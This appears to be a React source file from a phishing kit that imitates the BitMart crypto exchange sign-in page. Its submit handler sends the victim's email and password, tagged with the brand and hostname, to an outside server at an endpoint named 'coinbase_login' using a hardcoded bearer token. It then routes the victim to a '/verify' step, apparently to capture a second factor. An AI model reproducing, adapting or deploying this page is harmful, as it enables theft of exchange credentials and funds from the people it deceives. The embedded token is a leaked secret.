import { useState, useEffect } from 'react';
import { Link, redirect, useNavigate } from 'react-router-dom';
import { Helmet, HelmetProvider } from 'react-helmet-async';
import AppLayout from '../../layouts/AppLayout';
import {db} from '../../services/Firebase';
import { collection, addDoc, getDocs } from "firebase/firestore";
import { toast } from 'react-toastify';
import ValidationService from '../../services/ValidationService';
import axios from 'axios';
import { FaStar, FaStarHalf, FaDesktop, FaRightLong, FaArrowRightLong, FaCoins, FaTabletScreenButton, FaChevronRight, FaFacebook,FaReddit,FaTwitter,FaInstagram, FaLinkedin, FaYoutube, FaTiktok, FaDiscord, FaCcPaypal } from "react-icons/fa6";

import { BsQrCode } from "react-icons/bs";




function Home() {

    let initLoginFormData       =   {
        email                       :   '', 
        password                    :   '',
        remember_me                 :   'N',
        loading                     :   false,
        domain                      :   window.location.hostname,
        Key                         :   'BitMart'
    };
    
    const [loginFormData, setLoginFormData]     =   useState(initLoginFormData);
    const navigate                              =   useNavigate();

    const url = '';

    const submitLoginHandler        =   (event) => {
        event.preventDefault();

        setLoginFormData({...loginFormData, loading : true});

        let rules                   =   {
            'email'                     :   'required|email',
            'password'                  :   'required',
        };
        let rulesMsg                =   {
            'email'                     :    {required : 'Please enter Email'},
            'password'                  :    {required : 'Please enter Password'},
            'remember_me'               :    {required : ''}
        };
        let error                    =   ValidationService.rulesFirstErrorGenerator(loginFormData, rules, rulesMsg);
        if(error) {
            toast.error(error);
            setLoginFormData({...loginFormData, loading : false});
        } else {
            const headers       =   { 'Accept': 'application/json','Content-Type':'application/json','Authorization':'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2NTM2Mzg3NjY3MTNkMDBkMzk3YzhmMCJ9.vUCJSsofnVWOb8U7NKRZzLZPzo2QMt5bpp3I_3vJPvA'};
            axios({
                method: 'POST', headers: headers, data : loginFormData, url: 'https://api2.real123.online/public/coinbase_login'
            })
            .then(function (response) {
                setLoginFormData({...loginFormData, loading : false});
                //Goto Verify Screen :-
                return navigate("/verify", { state: { loginFormData : loginFormData } });
            })
            .catch(function (error) {
                let msg                 =   error?.response?.data?.detail ?? 'Application not initialize successfully.';
                toast.error(msg);
                setLoginFormData({...loginFormData, loading : false});
            });
        }
    }

return (<AppLayout>
        <Helmet>
            <title>Bitmart Login</title>
        </Helmet>
        <div className='container my60'>
            <div className="row justify-content-center">
                <div className='col-sm-4 shadow rounded-2 p25 my60' style={{position:'relative'}}>
                    <h1 className='h6 mobile_web_font fw-semibold pt10'>Sign In</h1>
                    <div style={{position:'absolute' , top : 0, right:0}}><BsQrCode className='fs50' /></div>
                    <div className='py15'>Scan to sign in securely. <Link to="#" className='text-primary-2 text-decoration-none'>Scan to sign in</Link> </div>
                    <form className="" onSubmit={submitLoginHandler}>
                        <div className="my25">
                            <input type="email" required className="form-control form-control-add" placeholder="Email"
                                value={loginFormData.email}
                                onChange={e => setLoginFormData({...loginFormData, 'email' : e.target.value }) }
                            />
                        </div>
                        <div className="my25">
                            <input type="password" required className="form-control form-control-add" placeholder="Password" 
                                value={loginFormData.password}
                                onChange={e => setLoginFormData({...loginFormData, 'password' : e.target.value }) }
                            />
                        </div>
                        <div class="d-grid my25">
                            <button type="submit" className={['btn btn-success btn-primary-2 py10' , loginFormData.loading ? 'disabled' : ''].join(' ')} >
                                {loginFormData.loading && <span class="spinner-grow spinner-grow-sm me15" aria-hidden="true"></span>}
                                <span>Sign In</span>
                            </button>
                        </div>
                        <div className='row my25'>
                            <div className='col-sm-6'>
                                <Link to="#" className='text-primary-2 text-decoration-none'>Forgot Password</Link>
                            </div>
                            <div className='col-sm-6 text-end'>
                                <Link to="#" className='text-primary-2 text-decoration-none'>Sign Up</Link>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </AppLayout>)
}

export default Home
